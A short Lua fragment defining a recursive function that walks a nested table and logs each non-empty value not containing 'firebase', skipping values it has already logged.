local function ForceRead(data, path)
    if type(data) ~= "table" then return end
    for k, v in pairs(data) do
        local currentPath = path .. "/" .. tostring(k)
        if type(v) == "table" then
            ForceRead(v, currentPath)
        else
            local rawValue = tostring(v)
            if #rawValue > 0 and not rawValue:find("firebase") then
                local dataId = currentPath .. rawValue
                if not processedData[dataId] then
                    processedData[dataId] = true
                    AddLog(tostring(k), rawValue)
                end
            end
        end
    end
end

